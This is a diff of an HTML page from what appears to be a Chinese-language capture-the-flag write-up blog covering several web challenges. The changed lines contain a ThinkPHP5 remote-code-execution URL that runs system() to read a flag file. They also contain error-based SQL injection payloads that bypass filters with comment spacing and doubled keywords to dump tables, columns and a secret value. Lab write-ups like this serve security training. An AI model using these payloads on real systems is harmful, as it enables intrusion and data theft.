@@ -253,14 +253,14 @@ ffifdyop
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    748
+                    779
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 
@@ -288,8 +288,7 @@ ffifdyop
 <p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入</p>
 </blockquote>
 <p>页面跳转后，查看源码：</p>
-<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221002111009637.png" style="zoom:80%;" />
-
+<p><img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014192452998.png" alt="image-20221014192452998"></p>
 <p>get传参：</p>
 <blockquote>
 <p>?x&#x3D;s155964671a&amp;y&#x3D;s214587387a</p>
@@ -383,7 +382,7 @@ ffifdyop
 
 
 <p>flag 在环境变量里</p>
-<p><img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014175234802.png" alt="image-20221014175234802"></p>
+<p><img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014183641582.png"></p>
 <h3 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h3><p>访问&#x2F;js&#x2F;1.js</p>
 <p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221014165254699.png"></p>
 <p>解码后是 NsScTf.php，访问</p>
@@ -411,20 +410,20 @@ ffifdyop
 <p>thinkphp5</p>
 <p>参考文章 <a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p>
 <p>找一个 payload</p>
-<blockquote>
-<pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">1.14.71.254</span></span><span class="token port-segment"><span class="token port-delimiter">:</span><span class="token port">28133</span></span></span><span class="token path"><span class="token path-separator">/</span>NSS<span class="token path-separator">/</span>index.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">s</span>=<span class="token value">index</span></span></span>|think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=cat /nss/ctf/flag/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;1.14.71.254:28133&#x2F;NSS&#x2F;index.php?s&#x3D;index|think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][0]&#x3D;cat &#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>随便测试了一下，发现是报错注入</p>
 <p>过滤了空格和 and, 分别用注释&#x2F;**&#x2F;和双写aandnd绕过</p>
 <p>爆数据库名</p>
 <p><img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014175708770.png"></p>
 <p>爆表名</p>
-<pre class="line-numbers language-none"><code class="language-none">nss&#x3D;1&#39;&#x2F;**&#x2F;aandnd&#x2F;**&#x2F;updatexml(1,concat(0x5e,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;0x4e53535f6462),0x5e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>回显</p>
 <blockquote>
-<p>Table ‘infmation_schema.tables’ doesn’t exist</p>
+<p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(table_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.tables&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;0x4e53535f6462),0x5e),1)#</p>
 </blockquote>
+<p>回显</p>
+<p><img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014184108987.png" alt="image-20221014184108987"></p>
 <p>or被过滤了，所以修改一下，双写or：</p>
 <blockquote>
 <p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(table_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;infoorrmation_schema.tables&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;0x4e53535f6462),0x5e),1)#</p>
@@ -434,8 +433,9 @@ ffifdyop
 
 
 <p>查NSS_tb字段：</p>
-<pre class="line-numbers language-none"><code class="language-none">nss&#x3D;1&#39;&#x2F;**&#x2F;aandnd&#x2F;**&#x2F;updatexml(1,concat(0x5e,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;infoorrmation_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x4e53535f7462),0x5e),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<blockquote>
+<p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,(select&#x2F;<strong>&#x2F;group_concat(column_name)&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;infoorrmation_schema.columns&#x2F;</strong>&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x4e53535f7462),0x5e),1)#</p>
+</blockquote>
 <img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014182125135.png"  />
 
 <p>查Secr3t字段值：</p>
@@ -447,6 +447,9 @@ ffifdyop
 
 
 <p>得到flag，但不完整，使用mid 就可以得到flag后面的一部分</p>
+<blockquote>
+<p>nss&#x3D;1’&#x2F;<strong>&#x2F;aandnd&#x2F;</strong>&#x2F;updatexml(1,concat(0x5e,mid((select&#x2F;<strong>&#x2F;Secr3t&#x2F;</strong>&#x2F;from&#x2F;**&#x2F;NSS_tb),32),0x5e),1)#</p>
+</blockquote>
 <img src="C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20221014183402792.png"  />
 
 
